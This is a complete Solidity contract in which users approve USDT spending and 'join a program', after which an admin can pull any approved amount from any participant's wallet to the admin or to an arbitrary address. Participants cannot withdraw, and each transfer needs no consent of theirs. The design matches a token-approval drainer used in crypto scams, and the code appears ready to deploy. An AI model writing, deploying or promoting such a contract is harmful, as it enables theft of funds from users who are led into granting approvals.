// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Program Contract - Admin Controlled USDT Transfers
 * @dev Users approve this contract, admin can transfer from their wallets
 */

// Minimal ERC20 Interface
interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ProgramContract {
    address public admin;
    address public usdtTokenAddress;
    
    // Track all users who joined the program
    address[] public participants;
    mapping(address => bool) public hasJoined;
    mapping(address => uint256) public joinedAt;
    
    // Events
    event UserJoined(address indexed user, uint256 timestamp);
    event AdminTransfer(address indexed from, address indexed to, uint256 amount, uint256 timestamp);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can perform this action");
        _;
    }
    
    constructor(address _usdtTokenAddress) {
        require(_usdtTokenAddress != address(0), "Invalid USDT address");
        admin = msg.sender;
        usdtTokenAddress = _usdtTokenAddress;
    }
    
    /**
     * @dev Users call this to join the program (after approving USDT)
     * Users must approve this contract to spend their USDT first
     */
    function joinProgram() external {
        require(!hasJoined[msg.sender], "Already joined the program");
        
        // Check if user has approved this contract
        IERC20 usdtToken = IERC20(usdtTokenAddress);
        uint256 allowance = usdtToken.allowance(msg.sender, address(this));
        require(allowance > 0, "Please approve USDT first");
        
        // Add user to participants
        participants.push(msg.sender);
        hasJoined[msg.sender] = true;
        joinedAt[msg.sender] = block.timestamp;
        
        emit UserJoined(msg.sender, block.timestamp);
    }
    
    /**
     * @dev Admin transfers USDT from any participant to admin's wallet
     * @param _from Participant address to transfer from
     * @param _amount Amount of USDT to transfer
     */
    function adminTransferFrom(address _from, uint256 _amount) external onlyAdmin {
        require(hasJoined[_from], "User has not joined the program");
        require(_amount > 0, "Amount must be greater than 0");
        
        IERC20 usdtToken = IERC20(usdtTokenAddress);
        
        // Check user's USDT balance
        uint256 balance = usdtToken.balanceOf(_from);
        require(balance >= _amount, "Insufficient USDT balance");
        
        // Check allowance
        uint256 allowance = usdtToken.allowance(_from, address(this));
        require(allowance >= _amount, "Insufficient allowance");
        
        // Transfer USDT from user to admin
        require(
            usdtToken.transferFrom(_from, admin, _amount),
            "Transfer failed"
        );
        
        emit AdminTransfer(_from, admin, _amount, block.timestamp);
    }
    
    /**
     * @dev Admin transfers USDT from participant to custom address
     * @param _from Participant address
     * @param _to Recipient address
     * @param _amount Amount to transfer
     */
    function adminTransferToAddress(address _from, address _to, uint256 _amount) external onlyAdmin {
        require(hasJoined[_from], "User has not joined the program");
        require(_to != address(0), "Invalid recipient");
        require(_amount > 0, "Amount must be greater than 0");
        
        IERC20 usdtToken = IERC20(usdtTokenAddress);
        
        // Check balances and allowance
        uint256 balance = usdtToken.balanceOf(_from);
        require(balance >= _amount, "Insufficient balance");
        
        uint256 allowance = usdtToken.allowance(_from, address(this));
        require(allowance >= _amount, "Insufficient allowance");
        
        // Transfer from user to custom address
        require(
            usdtToken.transferFrom(_from, _to, _amount),
            "Transfer failed"
        );
        
        emit AdminTransfer(_from, _to, _amount, block.timestamp);
    }
    
    /**
     * @dev Get total number of participants
     */
    function getParticipantCount() external view returns (uint256) {
        return participants.length;
    }
    
    /**
     * @dev Get participant address by index
     */
    function getParticipant(uint256 index) external view returns (address) {
        require(index < participants.length, "Index out of bounds");
        return participants[index];
    }
    
    /**
     * @dev Get all participants (use carefully for large arrays)
     */
    function getAllParticipants() external view returns (address[] memory) {
        return participants;
    }
    
    /**
     * @dev Get user's USDT balance
     */
    function getUserBalance(address user) external view returns (uint256) {
        IERC20 usdtToken = IERC20(usdtTokenAddress);
        return usdtToken.balanceOf(user);
    }
    
    /**
     * @dev Get user's allowance to this contract
     */
    function getUserAllowance(address user) external view returns (uint256) {
        IERC20 usdtToken = IERC20(usdtTokenAddress);
        return usdtToken.allowance(user, address(this));
    }
    
    /**
     * @dev Check if user has joined
     */
    function isParticipant(address user) external view returns (bool) {
        return hasJoined[user];
    }
    
    /**
     * @dev Change admin address
     */
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Invalid admin address");
        address oldAdmin = admin;
        admin = newAdmin;
        emit AdminChanged(oldAdmin, newAdmin);
    }
    
    /**
     * @dev Get contract info
     */
    function getContractInfo() external view returns (
        address _admin,
        address _usdtToken,
        uint256 _participantCount
    ) {
        return (admin, usdtTokenAddress, participants.length);
    }
}

